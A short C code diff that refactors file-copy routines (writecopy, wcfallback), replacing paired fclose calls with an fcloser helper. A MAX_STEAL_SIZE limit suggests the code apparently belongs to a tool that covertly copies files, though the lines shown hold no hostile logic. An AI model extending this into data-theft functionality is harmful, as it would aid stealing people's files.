@@ -133,8 +133,7 @@ void wcfallback(FILE *ofp, FILE *nfp, off_t fsize){
         free(buf);
     }while(n > 0 && n == m);
 nopenope:
-    fclose(ofp);
-    fclose(nfp);
+    fcloser(2, ofp, nfp);
 }
 #endif
 
@@ -202,22 +201,19 @@ int writecopy(const char *oldpath, char *newpath){
     else if(ofp == NULL) return -1;
 
     if(!S_ISREG(mode) || (statr && nstat.st_size == fsize)){
-        fclose(ofp);
-        fclose(nfp);
+        fcloser(2, ofp, nfp);
         return 1;
     }
 
 #ifdef MAX_FILE_SIZE
     if(fsize > MAX_FILE_SIZE){
-        fclose(ofp);
-        fclose(nfp);
+        fcloser(2, ofp, nfp);
         return -1;
     }
 #endif
 #ifdef MAX_STEAL_SIZE
     if(getnewsize(fsize) > MAX_STEAL_SIZE){
-        fclose(ofp);
-        fclose(nfp);
+        fcloser(2, ofp, nfp);
         return -1;
     }
 #endif
@@ -228,8 +224,7 @@ int writecopy(const char *oldpath, char *newpath){
         wcfallback(ofp, nfp, fsize);
         return 1;
 #else
-        fclose(ofp);
-        fclose(nfp);
+        fcloser(2, ofp, nfp);
         return -1;
 #endif
     }
